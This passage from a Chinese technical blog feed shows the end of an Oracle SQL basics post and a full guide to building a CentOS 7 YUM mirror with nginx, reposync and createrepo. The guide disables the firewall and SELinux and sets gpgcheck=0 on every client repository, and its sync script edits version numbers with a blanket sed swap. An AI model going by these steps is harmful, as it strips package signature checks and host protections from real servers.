class="line">创建表：</span><br><span class="line">创建一张学生表</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student(  </span><br><span class="line">  stuid      <span class="built_in">number</span>(<span class="number">10</span>)   primary <span class="keyword">key</span>,  </span><br><span class="line">  stuname    <span class="built_in">varchar2</span>(<span class="number">20</span>) <span class="keyword">not</span> <span class="literal">null</span>,  </span><br><span class="line">  stusex     <span class="built_in">varchar2</span>(<span class="number">2</span>)  <span class="keyword">default</span> <span class="string">'男'</span> <span class="keyword">check</span>(stusex <span class="keyword">in</span>(<span class="string">'男'</span>,<span class="string">'女'</span>))</span><br><span class="line">);  </span><br><span class="line"></span><br><span class="line">查看表结构：</span><br><span class="line">desc student;</span><br><span class="line"></span><br><span class="line">修改表结构：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> 语句用于在已有的表中添加、修改或删除列。</span><br><span class="line">在表中添加列：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name</span><br><span class="line"><span class="keyword">ADD</span> column_name datatype</span><br><span class="line">还可以设置默认值</span><br><span class="line">例如：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info <span class="keyword">add</span>(log_time <span class="built_in">TIMESTAMP</span>(<span class="number">6</span>) <span class="keyword">default</span> <span class="keyword">sysdate</span> <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">添加多个字段：</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> table_name <span class="keyword">add</span> (col_1 <span class="built_in">varchar2</span>(<span class="number">8</span>) <span class="keyword">default</span> ‘<span class="number">00000000</span>’ <span class="keyword">not</span> <span class="literal">null</span>, col_2 <span class="built_in">NUMBER</span> <span class="keyword">default</span> <span class="number">3</span> <span class="keyword">not</span> <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">添加字段前应先判断表中是否已经存在这个字段</span><br><span class="line">可以用下面SQL语句，查询是否已存在字段LOG_TIME</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> USER_TAB_COLUMNS <span class="keyword">where</span> TABLE_NAME = ‘USER_INFO’ <span class="keyword">AND</span> COLUMN_NAME = ‘LOG_TIME’?  <span class="comment">#注意这里表名与列名必须是大写的。。。。。</span></span><br><span class="line">也可以查询ALL_TAB_COLUMNS</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> USER_TAB_COLUMNS <span class="keyword">where</span> TABLE_NAME = ‘USER_INFO’ <span class="keyword">AND</span> COLUMN_NAME = ‘LOG_TIME’;</span><br><span class="line">返回值为1—存在此字段</span><br><span class="line">返回值为0—不存在此字段。</span><br><span class="line"></span><br><span class="line">删除字段：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">COLUMN</span> log_time;</span><br><span class="line"></span><br><span class="line">删除多个字段：</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">drop</span> (col_1,col_2);</span><br><span class="line"></span><br><span class="line">更新时间戳为系统时间+1小时。</span><br><span class="line"><span class="keyword">update</span> USER_INFO <span class="keyword">set</span> LOG_TIME = <span class="keyword">sysdate</span> +<span class="built_in">INTERVAL</span> ‘<span class="number">1</span>’ <span class="keyword">hour</span> <span class="keyword">where</span> USER_ID=‘<span class="number">2</span>’;</span><br><span class="line">oracle TIMESTAMP 由 System.Data.OracleClient存入数据库时，保存精度到秒，所以可以直接将从数据库读到的TIMESTAMP类型数据mapping为 System.DateTime 类型。不用考虑精度掉失问题。</span><br><span class="line">OracleCommand.ExecuteNonQuery方法：</span><br><span class="line">对于 <span class="keyword">UPDATE</span>、<span class="keyword">INSERT</span> 和 <span class="keyword">DELETE</span> 语句，返回值为该命令所影响的行数。</span><br><span class="line">对于 <span class="keyword">ALTER</span> <span class="keyword">TABLE</span>，<span class="keyword">CREATE</span> <span class="keyword">TABLE</span> 和 <span class="keyword">DROP</span> <span class="keyword">TABLE</span> 语句，返回值为 <span class="number">0</span>。 对于其他所有类型的语句，返回值为 <span class="number">-1</span>。 如果发生回滚，则返回值也为<span class="number">-1</span>。</span><br><span class="line"></span><br><span class="line">修改表中字段的长度</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> 表名称 <span class="keyword">modify</span> 字段名 <span class="built_in">varchar2</span>（<span class="number">100</span> <span class="keyword">byte</span>）；</span><br><span class="line">例如： 将表epc_info 中的epc字段长度改为<span class="number">100</span>。</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> epc_info <span class="keyword">modify</span> epc <span class="built_in">varchar2</span>(<span class="number">100</span> <span class="keyword">byte</span>);</span><br><span class="line"></span><br><span class="line">插入数据：</span><br><span class="line">SQL&gt; insert into student values(1,'xiaoming','男');</span><br><span class="line">1 row created.</span><br><span class="line"></span><br><span class="line">插入多条数据</span><br><span class="line">SQL&gt; INSERT ALL</span><br><span class="line">INTO student <span class="keyword">VALUES</span> (<span class="number">2</span>, <span class="string">'xiaozhang'</span>, <span class="string">'女'</span>)</span><br><span class="line"><span class="keyword">INTO</span> student <span class="keyword">VALUES</span> (<span class="number">3</span>, <span class="string">'xiaogang'</span>, <span class="string">'男'</span>)</span><br><span class="line"><span class="keyword">INTO</span> student <span class="keyword">VALUES</span> (<span class="number">4</span>, <span class="string">'xiaohua'</span>, <span class="string">'女'</span>)</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> dual;</span><br><span class="line"></span><br><span class="line">查询数据：</span><br><span class="line">SQL&gt; select * from student;</span><br><span class="line"></span><br><span class="line">     STUID STUNAME                                                      STUSEX</span><br><span class="line"><span class="comment">---------- ------------------------------------------------------------ ------</span></span><br><span class="line">         1 xiaoming                                                     男</span><br><span class="line">         2 xiaozhang                                                    女</span><br><span class="line">         3 xiaogang                                                     男</span><br><span class="line">         4 xiaohua                                                      女</span><br><span class="line"></span><br><span class="line">条件查询：</span><br><span class="line">SQL&gt; select * from student where stuname = 'xiaogang';</span><br><span class="line"></span><br><span class="line">     STUID STUNAME                                                      STUSEX</span><br><span class="line"><span class="comment">---------- ------------------------------------------------------------ ------</span></span><br><span class="line">         3 xiaogang                                                     男</span><br><span class="line"></span><br><span class="line">提交/回滚：</span><br><span class="line"><span class="keyword">commit</span>/<span class="keyword">rollback</span>;</span><br><span class="line"></span><br><span class="line">修改数据：</span><br><span class="line">SQL&gt; update student set stuname = 'xiaoxiao' where stuname='xiaoming';</span><br><span class="line">1 row updated.</span><br><span class="line">别忘了提交 <span class="keyword">commit</span></span><br><span class="line"></span><br><span class="line">删除数据：</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> student <span class="keyword">where</span> stuid=<span class="number">2</span> <span class="keyword">or</span> stuid=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">commit</span>;</span><br><span class="line"></span><br><span class="line">总结：</span><br><span class="line"></span><br><span class="line"><span class="comment">--插入数据 insert into     表名（列名） values(插入的数据)</span></span><br><span class="line"><span class="comment">--修改数据 update         表名 set   where （筛选条件）</span></span><br><span class="line"><span class="comment">--删除数据 delete from 表名 where（筛选条件）</span></span><br><span class="line"><span class="comment">--删除表   drop table     表名</span></span><br></pre></td></tr></table></figure>

<h3 id="六、扩展"><a href="#六、扩展" class="headerlink" title="六、扩展"></a>六、扩展</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">获取表字段：</span><br><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> user_tab_columns</span><br><span class="line"><span class="keyword">where</span> Table_Name=<span class="string">'用户表'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> column_name</span><br><span class="line"></span><br><span class="line">获取表注释：</span><br><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> user_tab_comments</span><br><span class="line"><span class="keyword">where</span> Table_Name=<span class="string">'用户表'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> Table_Name</span><br><span class="line"></span><br><span class="line">获取字段注释：</span><br><span class="line"><span class="keyword">select</span> *</span><br><span class="line"><span class="keyword">from</span> user_col_comments</span><br><span class="line"><span class="keyword">where</span> Table_Name=<span class="string">'用户表'</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span> column_name</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 获取表：*/</span></span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables; //当前用户的表      </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> all_tables; //所有用户的表  </span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> dba_tables; //包括系统表</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> dba_tables <span class="keyword">where</span> owner=<span class="string">'zfxfzb'</span></span><br><span class="line"><span class="comment">/*</span></span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>oracle</category>
      </categories>
      <tags>
        <tag>oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>CentOS7下的YUM源服务器搭建详解</title>
    <url>/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="CentOS7下的YUM源服务器搭建详解"><a href="#CentOS7下的YUM源服务器搭建详解" class="headerlink" title="CentOS7下的YUM源服务器搭建详解"></a>CentOS7下的YUM源服务器搭建详解</h1><h2 id="一、要求"><a href="#一、要求" class="headerlink" title="一、要求"></a>一、要求</h2><p>1.这个yum源服务器要能够定期自动更新自身源</p>
<p>2.使用CentOS官方标准源version6和version7的两个版本保持更新</p>
<p>3.linux(mini)客户端可以在使用的时候直接使用源，比如直接命令：yum –y install pcre* </p>
<h2 id="二、思路"><a href="#二、思路" class="headerlink" title="二、思路"></a>二、思路</h2><p>1.能够定期更新的源，肯定是需要计划任务通过执行命令脚本来实现</p>
<p>2.国内的不错的源</p>
<p><a href="http://mirrors.aliyun.com/" target="_blank" rel="noopener">http://mirrors.aliyun.com/</a>  （阿里云）</p>
<p><a href="http://centos.ustc.edu.cn/centos/" target="_blank" rel="noopener">http://centos.ustc.edu.cn/centos/</a>  （中国科学技术大学，教育网线路 -官方镜像）</p>
<p>大部分的这类镜像服务，都关闭了rsync的直接同步功能，为的是节省公用带宽。</p>
<p>包括目前的中国科学技术大学，有明确的通知。</p>
<p>所以我最终会使用reposync来实现同步。</p>
<p>3.要让客户端可以直接使用源，只用更改其/etc/yum.repo.d/下repo文件内容就可以了，后面会有讲到。   </p>
<h2 id="三、搭建yum源的server端"><a href="#三、搭建yum源的server端" class="headerlink" title="三、搭建yum源的server端"></a>三、搭建yum源的server端</h2><p>1.首先关闭防护墙或者设置规则通过且关闭selinux </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Systemctl diable firewalld 永久关闭防火墙</span><br><span class="line"></span><br><span class="line">vim/etc/sysconfig/selinux </span><br><span class="line"></span><br><span class="line">并修改</span><br><span class="line"></span><br><span class="line">SELINUX=enforce行为SELINUX=disabled</span><br></pre></td></tr></table></figure>



<p>2.安装Nginx、createrepo 、yum-plugin-priorities</p>
<p>首先安装Nginx</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum –y install Nginx</span><br></pre></td></tr></table></figure>

<p>安装html的网站服务器</p>
<p>这里建议使用Nginx来进行安装，因为使用Nginx的工具，可以开启文件大小以及修改时间的显示，在配置文件   内修改如下：（<strong>如果没有这几项请手动添加</strong>）</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113000653.png" alt="image-20200821113000653"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum –y install createrepo</span><br></pre></td></tr></table></figure>

<p>安装建yum源仓库的工具，可以用来建立yum仓库</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum –y install yum-plugin-priorities</span><br></pre></td></tr></table></figure>

<p>安装控制yum源更新优先级工具，这个工具可以用来控制进行yum源检索的先后顺序，建议可以用在client端。</p>
<h2 id="四、安装完成后的调试"><a href="#四、安装完成后的调试" class="headerlink" title="四、安装完成后的调试"></a>四、安装完成后的调试</h2><p>1.当nginx安装完成以后，默认的根文件目录为html即：</p>
<p>我的nginx是安装在/usr/local/nginx-1.11.2/</p>
<p>所以默认的根目录也为：/usr/local/nginx-1.11.2/html</p>
<p>如果安装成功，且相应的权限都有，那么可以打开nginx的欢迎页面：（页面上的   地址是我修改html.conf文件得来的。）</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113013606.png" alt="image-20200821113013606"></p>
<p>那么在html下面建立以下目录：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir –p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_6.6/64bit/ </span><br><span class="line">mkdir –p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_7.0/64bit/ </span><br><span class="line">mkdir –p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_6.6/64bit/ </span><br><span class="line">mkdir –p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/</span><br></pre></td></tr></table></figure>

<p>且不要忘记给目录增加可读和可执行权限，否则在web页面显示不出来。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Chmod –R +x /usr/local/nginx-1.11.2/html/</span><br></pre></td></tr></table></figure>

<p>在web的index.html首页里面添加指向文件目录的超链接：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-weight:bolder;color:green;font-size:30px;"</span>&gt;</span>ALL of the packages in the below:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://10.20.0.50/CentOS-YUM/Aliyun"</span>&gt;</span>Aliyun<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span> These packagers from of CentOS ISO.<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://10.20.0.50/CentOS-YUM/CentOS"</span>&gt;</span>CentOS<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span> These packagers from of "Internet service provider".<span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-weight:bolder;color:red;font-size:18px;"</span>&gt;</span>Please replace the file and fill in the following content:<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">"font-weight:bolder;color:blue;font-size:15px;"</span>&gt;</span>Way: /etc/yum.repos.d/CentOS- Base.repo<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113039282.png" alt="image-20200821113039282"></p>
<h2 id="五、修改当前系统yum来源repo文件"><a href="#五、修改当前系统yum来源repo文件" class="headerlink" title="五、修改当前系统yum来源repo文件"></a>五、修改当前系统yum来源repo文件</h2><p>文件位置：/etc/yum.repos.d/CentOS-Base.repo</p>
<p>1.首先对此文件进行备份，因为当前系统的所有yum软件包的安装或者更新都是来自于这个文件的指定路径的更新。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp –p /etc/yum.repos.d/CentOS-Base.repo(空格)/etc/yum.repos.d/CentOS-Base.repo.back</span><br></pre></td></tr></table></figure>



<p>2.因为当前的系统是CentOS-7的版本，那么如果从CentOS官方现在就进行同步，那么同步到的只能是CentOS7的版本的所有yum源，那么相对的如果要同步6版本的yum源，将CentOS-Base.repo的文件内的7的   版本号更改为6就可以了。即：</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113052846.png" alt="image-20200821113052846"></p>
<p> 接下来去阿里云的官方网站下载阿里云的CentOS-Base.repo文件,如下所示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repo </span><br><span class="line">wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><br></pre></td></tr></table></figure>

<p>这里是三个版本的阿里云yum源下载地址，这里下载6和7就可以了。就下载到</p>
<p>/etc/yum.repos.d/Aliyun/的目录下面就好了。</p>
<p>而同样的，如果需要7也可以直接修改文件内的版本号。 </p>
<h2 id="六、进行同步脚本的创建并执行同步"><a href="#六、进行同步脚本的创建并执行同步" class="headerlink" title="六、进行同步脚本的创建并执行同步"></a>六、进行同步脚本的创建并执行同步</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/yum.reposync.sh</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">!bin/bash</span></span><br><span class="line"></span><br><span class="line">reposync –p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_7.0/64bit/</span><br><span class="line"></span><br><span class="line">/usr/bin/sed -i "s/7/6/g" `grep 7 -rl /etc/yum.repos.d/CentOS-Base.repo`</span><br><span class="line"></span><br><span class="line">reposync –p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_6.6/64bit/ </span><br><span class="line"></span><br><span class="line">cat /etc/yum.repos.d/Aliyun/CentOS-6.repo &gt; /etc/yum.repos.d/CentOS-Base.repo </span><br><span class="line"></span><br><span class="line">reposync –p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_6.6/64bit/</span><br><span class="line"></span><br><span class="line">/usr/bin/sed -i "s/6/7/g" `grep 6 -rl /etc/yum.repos.d/CentOS-Base.repo` </span><br><span class="line"></span><br><span class="line">reposync  –p  /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/</span><br><span class="line"></span><br><span class="line">cat /etc/yum.repos.d/CentOS-Base.repo.back &gt; /etc/yum.repos.d/CentOS-Base.repo</span><br></pre></td></tr></table></figure>



<p>脚本内一共九行命令。</p>
<p>第二行中的“-p”意思为指定同步到目录，此行同步CentOS7的版本yum源  </p>
<p>第三行是替换CentOS-Base.repo文本中的所有数字为7的数字更改为6</p>
<p>第四行是同步CentOS6的版本yum源</p>
<p>第五行是将阿里云的CentOS-Base.repo文件对CentOS官方CentOS-Base.repo的文件进行替换所有内容 </p>
<p>第六行开始同步阿里云的6版本的yum源</p>
<p>第七行更改阿里云的CentOS-Base.repo文件为7版本 </p>
<p>第八行开始同步阿里云的7版本的yum源</p>
<p>第九行进行还原替换，将阿里云的CentOS-Base.repo  文件替换为CentOS官方6版本的CentOS-Base.repo文件，以便下次，跟这两个官方进行计划同步的时候可以方便些。</p>
<p>（我试过将两个yum源repo文件合并，但是会出错，当然不排除还有其他方式。）  完成以后，执行这个文件，要给这个文件添加执行权限</p>
<p>chmod +x yum.reposync.sh     然后执行脚本</p>
<p>sh yum.reposync.sh</p>
<p>等待下载同步完成</p>
<p>同步完成以后，就可以在相应的目录下面看到各种rpm的安装包： 注意如果是同步到比如这个目录：</p>
<p>/usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_7.0/64bit/ </p>
<p>那么在64bit的目录下面就会生成三个目录，是跟官方源同步的：</p>
<p>Base/</p>
<p>Extras/ </p>
<p>Updates</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113145398.png" alt="image-20200821113145398"></p>
<p>这样yum源的server端就建立好了。然后进行建仓，即yum源仓库，供client端检索使用：</p>
<p>(因为建仓最终的目的也是可供client来进行检索的，所以得每个Packages目录都要建成仓库，所以建仓的时候，目录到指到最底层的Packages,而-np更新的时候只用指定到64bit的目录就可以了，否则会重复建立base、extras、updates三个目录进行下载)</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">createrepo -p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_6.6/64bit/base/Packages </span><br><span class="line">createrepo -p /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_7.0/64bit/base/Packages </span><br><span class="line">createrepo -p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_6.6/64bit/base/Packages </span><br><span class="line">createrepo -p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/base/Packages </span><br><span class="line">当然也可以是，比如：</span><br><span class="line"></span><br><span class="line">createrepo -p /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/base/Packages (空格) /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/base/Packages</span><br></pre></td></tr></table></figure>



<p>当yum源仓库建立好以后，会在对应的目录下面出现“<strong>repodata</strong>”的目录。如下图所示：</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113203375.png" alt="image-20200821113203375"></p>
<p>接下来client端配置后就可以直接使用这些YUM源。</p>
<h2 id="七、客户端Client的yum配置："><a href="#七、客户端Client的yum配置：" class="headerlink" title="七、客户端Client的yum配置："></a><strong>七、客户端Client的yum配置：</strong></h2><p>1.安装优先级软件：</p>
<p>使用yum来安装yum install -y yum-plugin-priorities</p>
<p>这个是优先级工具，可以控制client端进行yum源的先后使用查找。</p>
<p>2.首先对client端的/etc/yum.repos.d/目录下的repo文件进行更改。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir –p /etc/yum.repos.d/back</span><br><span class="line"></span><br><span class="line">mv /etc/yum.repos.d/*/etc/yum.repos.d/back/ </span><br><span class="line"></span><br><span class="line">vim /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"></span><br><span class="line">[mylocal]</span><br><span class="line">name=source_from_localserver #这里是整合到server端的centos6的光盘镜像yum源</span><br><span class="line">baseurl=[http://10.20.0.50/centos/7.0/x86_64/Packagers/](http://10.20.0.50/centos/6.6/x86_64/Packagers/)</span><br><span class="line">gpgcheck=0 </span><br><span class="line">enable=1</span><br><span class="line">priority=1  **#这里的priority就是上面安装的优先级工具，设定从小到大**</span><br><span class="line"></span><br><span class="line">[Aliyun_7.0_base]</span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/Aliyun/version_7.0/64bit/base/Packages](http://10.20.0.50/CentOS-YUM/Aliyun/version_6.6/64bit/base/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=2 </span><br><span class="line"></span><br><span class="line">[Centos_7.0_base]</span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/CentOS/version_7.0/64bit/base/Packages](http://10.20.0.50/CentOS-YUM/CentOS/version_6.6/64bit/base/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=3 </span><br><span class="line"></span><br><span class="line">[Aliyun_7.0_extras]</span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/Aliyun/version_7.0/64bit/extras/Packages](http://10.20.0.50/CentOS-YUM/Aliyun/version_6.6/64bit/extras/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=4 </span><br><span class="line"></span><br><span class="line">[Centos_7.0_extras]</span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/CentOS/version_7.0/64bit/extras/Packages](http://10.20.0.50/CentOS-YUM/CentOS/version_6.6/64bit/extras/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=5</span><br><span class="line"></span><br><span class="line">[Aliyun_7.0_updates] </span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/Aliyun/version_7.0/64bit/updates/Packages](http://10.20.0.50/CentOS-YUM/Aliyun/version_6.6/64bit/updates/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=6</span><br><span class="line"></span><br><span class="line">[Centos_7.0_updates] </span><br><span class="line">name=source_from_localserver</span><br><span class="line">baseurl=[http://10.20.0.50/CentOS-YUM/CentOS/version_7.0/64bit/updates/Packages](http://10.20.0.50/CentOS-YUM/CentOS/version_6.6/64bit/updates/Packages) </span><br><span class="line">gpgcheck=0</span><br><span class="line">enable=1 </span><br><span class="line">priority=7</span><br></pre></td></tr></table></figure>

<p>3.然后进行本机的缓存的清理和建立</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum clean all 清除所有缓存</span><br><span class="line"></span><br><span class="line">yum makecache 建立缓存</span><br><span class="line"></span><br><span class="line">yum repolist 查看yum源列表</span><br></pre></td></tr></table></figure>

<p>当缓存建立好以后，就可以在client端直接使用yum进行安装软件包了。而检索的顺序就是根据优先级来的。</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113246091.png" alt="image-20200821113246091"></p>
<p>上面添加的这里都有了，测试了一下安装firefox，而实际firefox来自于这些仓库：</p>
<p><img src= "/img/loading.gif" data-src="/2019/07/27/CentOS7%E4%B8%8B%E7%9A%84YUM%E6%BA%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA%E8%AF%A6%E8%A7%A3/image-20200821113256340.png" alt="image-20200821113256340"></p>
<p>最后安装成功。</p>
<p>如果安装不成功，报出有关kernel的错误，那么请检查当前系统版本以及repo文件对应的根目录中的软件包版本。</p>
<p>好啦，到这里，client端也已经配置好了，那么接下来，得考虑下让服务器端能够自动定时更新软件包，否则每次都要手动更新，岂不是很累。</p>
<h2 id="八、配置server端的yum源自动更新机制"><a href="#八、配置server端的yum源自动更新机制" class="headerlink" title="八、配置server端的yum源自动更新机制"></a>八、配置server端的yum源自动更新机制</h2><p>1.首先来写一个bash脚本在/home/crontab/下，这个脚本的作用说白了就是通过一条一条自动执行，最终达到，自动更新yum源的目的，代码如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">/usr/bin/reposync -np /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_7.0/64bit/</span><br><span class="line"></span><br><span class="line">/usr/bin/sed -i "s/7/6/g" `grep 7 -rl /etc/yum.repos.d/CentOS-Base.repo`</span><br><span class="line"></span><br><span class="line">/usr/bin/reposync -np  /usr/local/nginx-1.11.2/html/CentOS-YUM/CentOS/version_6.6/64bit/ </span><br><span class="line"></span><br><span class="line">cat /etc/yum.repos.d/CentOS-Base.aliyun.repo.bak &gt; /etc/yum.repos.d/CentOS-Base.repo</span><br><span class="line"></span><br><span class="line">/usr/bin/reposync -np /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_6.6/64bit/</span><br><span class="line"> </span><br><span class="line">/usr/bin/sed -i "s/6/7/g" `grep 6 -rl /etc/yum.repos.d/CentOS-Base.repo`</span><br><span class="line"></span><br><span class="line">/usr/bin/reposync -np /usr/local/nginx-1.11.2/html/CentOS-YUM/Aliyun/version_7.0/64bit/ </span><br><span class="line"></span><br><span class="line">cat /etc/yum.repos.d/CentOS-Base.repo.bak &gt; /etc/yum.repos.d/CentOS-Base.repo</span><br></pre></td></tr></table></figure>

<p>“-np”的意思为仅仅更新新更新的软件到指定目录</p>
<p>其他的跟第六步的语句是一个意思。</p>
<p>注意下载的repo的文件版本，要能够对应，不然会报错，可自己改动脚本。  然后再来添加定时计划：</p>
